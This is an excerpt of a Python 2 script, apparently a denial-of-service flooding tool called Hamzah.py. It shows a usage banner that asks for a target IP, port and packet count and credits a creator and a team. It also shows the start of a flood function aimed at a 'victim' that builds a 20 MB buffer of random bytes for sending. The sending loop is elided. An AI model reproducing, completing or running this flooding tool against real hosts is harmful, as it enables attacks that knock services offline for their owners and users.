...
def usage():
    ...
    print "#-------------------------------------------------------#"
    print "#   \033[1;91mCommand: " "python2 Hamzah.py " "<ip> <port> <packet> \033[1;32m   #"
    print "#                                                       #"
    print "#\033[1;91mCreator:HamzahYahya  \033[1;32m##      ###       ##                #"
    print "#\033[1;91mTeam   : Muslimcyber        \033[1;32m##     #          ##                #"
...
def flood(victim, vport, duration):
    ...
    bytes = random._urandom(20000000)
